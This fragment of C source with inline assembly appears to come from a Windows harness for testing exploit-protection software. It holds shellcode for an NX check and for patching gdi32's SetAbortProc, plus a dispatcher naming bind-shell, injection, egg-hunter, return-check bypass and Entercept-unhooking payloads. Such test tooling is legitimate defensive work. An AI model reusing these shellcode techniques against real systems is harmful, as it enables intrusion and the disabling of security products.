		jmp ueh_stub		// push a clean code offset
ueh_pop_eip:
		add eax, 0x7c
		pop dword ptr [eax+0x3c]	// replace eip
		xor eax, eax		// resume execution
		ret					// the caller restores its stack himself
// ueh proc end

push_ueh:
		// only eh in the chain
		push -1
		mov fs:[0], esp

		// set ebx to 0 (to test if the dummy instr is executed)
		xor ebx, ebx

		// do the call
		call eax

		jmp post_ueh_stub

		// UEH stub to retrieve the adress to put in eip
ueh_stub:
		call ueh_pop_eip

post_ueh_stub:

		// restore the original UEH, discard the frame based eh
		pop eax
		pop eax
		pop dword ptr fs:[0]

		push 'XN'
		push esp		// msgbox title: "NX"

		// test if the dummy instruction were executed
		test ebx, ebx
		jnz nx_notpresent

// push msgbox body
nx_present:
		call msgbox
		x'N' x'X' x' ' x'e' x'n' x'a' x'b' x'l' x'e' x'd' x 0

nx_notpresent:
		call msgbox
		x'N' x'X' x' ' x'd' x'i' x's' x'a' x'b' x'l' x'e' x'd' x 0

error_alloc:
		push 'XN'
		push esp		// msgbox title: "NX"
		call msgbox
		x'e' x'r' x'r' x'o' x'r' x 0

msgbox:
		call do_msgbox		// show result to the user

		mov esp, ebp

		pop eax				// virtualalloced address
		test eax, eax
		jz end_test

		push 0x8000			// MEM_RELEASE
		push 0				// sz
		push eax			// addr
		mov edi, H_VirtualFree
		call find_proc
		call eax

end_test:
		popad
		ret

do_msgbox:
	}
	DOMSGBOX();
	_asm find_proc:
	FINDPROC();
	_asm sc_end:
}

void init_patch(void)
{
	INITSHELLCODE;
	_asm {
sc_start:
		pushad
	}
	FINDK32();
	_asm {
		mov edi, H_VirtualProtect
		call find_proc
		mov ebp, eax

		// find module
		call push_dll
		x'g' x'd' x'i' x'3' x'2' x 0
push_dll:
		mov edi, H_GetModuleHandleA
		call find_proc
		call eax

		// find address
		mov esi, eax
		mov edi, H_SetAbortProc
		call find_proc

		mov edi, eax

		push 0				// oldprot

		push esp			// &oldprot
		push 0x04			// rw
		push 0x50			// sz
		push edi			// addr
		call ebp

		// patch
		push edi
		call push_esi

patch_start:
		// opcodes to patch
		or eax, -1
		ret 8
patch_end:

push_esi:
		pop esi
		mov ecx, patch_end
		sub ecx, patch_start
		rep movsb
		pop edi

		// restore prot
		pop eax
		push 0

		push esp
		push eax
		push 0x50
		push edi
		call ebp
		
		pop eax
		// done

		popad
		ret

find_proc:
	}
	FINDPROC();
	_asm sc_end:
}

void backtrace(void)
{
	u32 *myebp;
	u32 *stackbase, *stacklimit;
	char buf[512];
	_asm {
		mov myebp, ebp
		mov eax, fs:[4]
		mov stackbase, eax
		mov eax, fs:[8]
		mov stacklimit, eax
	}
    
	while (myebp > stacklimit && myebp < stackbase) {
		_snprintf(buf, 512, "ebp: %.8lX, retaddr: %.8lX, next ebp: %.8lX", myebp, myebp[1], myebp[0]);
		addbacklog(buf);
		myebp = (u32*)myebp[0];
	}
}


int shellcode_handles(u32 id)
{
	switch (id) {

	case ID_EXITPROCESS:
		init_exitprocess();
		runshellcode();
		return TRUE;
	
	case ID_GETCMDLINE:
		init_getcommandline();
		runshellcode();
		return TRUE;

	case ID_BINDEXEC:
		init_bindlistenexecute();
		runshellcode();
		return TRUE;

	// shellcode, can run in a remote process, tries to spawn calc.exe
	case ID_PROC_CREATEPROCESS:
		init_createproc();
		runshellcode();
		return TRUE;
	case ID_PROC_WINEXEC:
		init_createproc_wexec();
		runshellcode();
		return TRUE;

	case ID_SC_PATCH:
		init_patch();
		runshellcode();
		return TRUE;

	// shellcode, can run in a remote process, tries to create a file "testfile"
	case ID_FILE_CREATEFILE:
		init_createfile();
		runshellcode();
		return TRUE;
	case ID_FILE_NTCREATEFILE:
		init_ntcreatefile();
		runshellcode();
		return TRUE;

	case ID_EXPLOITS_SHELLC_SIMPLE:
		init_shellc_simple();
		runshellcode();
		return TRUE;
	//
	// shellcodes designed to test the return address validation of the protection system
	// if they are run in a remote process, they scan memory for their return address pattern from PEbase or this process' k32 base
	// the shellcode will crash the target process if the pattern is not found
	//
	// if they are run in the current process from the stack, they can scan from different bases (pe, kernel32, heap)
	// the base address is patched before injection on the stack, the injector is required to set them up.
	// if they are run directly from the PE (neither remote nor stack), they are not patched and always scan from the PE hardcoded base.
	//
	case ID_EXPLOITS_SHELLC_RETRET:
		init_shellc_retret();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_RETCALL:
		init_shellc_retcall();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_RETCALLRETRET:
		init_shellc_retcallretret();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_RETCALLLEAVE:
		init_shellc_retcallleave();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_RETCALLEDIRET:
		init_shellc_retcallregret();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_RETCALLJMPESI:
		init_shellc_retcalljmpesi();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_RETCALLEDIJMPESI:
		init_shellc_retcallregjmpesi();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_RETCALLADDR:
		init_shellc_retcalladdr();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_SHELLC_FRAME:
		init_shellc_frame();
		runshellcode();
		return TRUE;

	// change the scan base address
	case ID_SC_RETMEMRWX:
	case ID_SC_RETMEMRX:
	case ID_SC_RETMEMRW:
	case ID_SC_RETMEMR:
		/* return on heap is only possible on local stack */
		CheckDlgButton(hDlg, IDC_CHK_RMTRUN, BST_UNCHECKED);
		//CheckDlgButton(hDlg, IDC_CHK_STKRUN, BST_CHECKED);
  
	case ID_SC_RETK32:
		if (IsDlgButtonChecked(hDlg, IDC_CHK_RMTRUN) == BST_UNCHECKED)
			CheckDlgButton(hDlg, IDC_CHK_STKRUN, BST_CHECKED);
		
	case ID_SC_RETPE:

		setupscanbase(id);
		return TRUE;

	// shellcodes running in a remote process, they scan their process memory for the egg value, then execute it
	// they should not crash the process if they do not find their egg
	case ID_EXPLOITS_EGG_HUNT:
		init_egghunt();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_EGG_HUNTSAFESEH:
		init_egghunt_sp2();
		runshellcode();
		return TRUE;
	case ID_EXPLOITS_EGG_INJECT:
		init_egg();
		runshellcode();
		return TRUE;

	// shellcode running in a remote process, allocates memory marked readwrite only and try to run code on it
	// it tries to catch the error raised by NX protection enabled, but the ueh should not be on the stack (which is not executable)
	case ID_DBG_NX:
		CheckDlgButton(hDlg, IDC_CHK_STKRUN, BST_UNCHECKED);
		init_testNX();
		runshellcode();
		return TRUE;

	// calls the hidapistub.dll Exp_UnhookAllAPIFunctions() function
	case ID_ENTERCEPT_CALLUNHOOKER:
		init_enterceptunhook();
		runshellcode();
		return TRUE;

	// helper, calculates the hash of an api name, which can then be used in shellcode writing
	case ID_DEBUG_HASHPROCNAME:
		calc_sc_hash();
		return TRUE;
	}
	return FALSE;
}

void shellcode_init(void)
{
	init_remote_cleanup();
	init_copy_to_stack();
	setupscanbase(ID_SC_RETPE);
}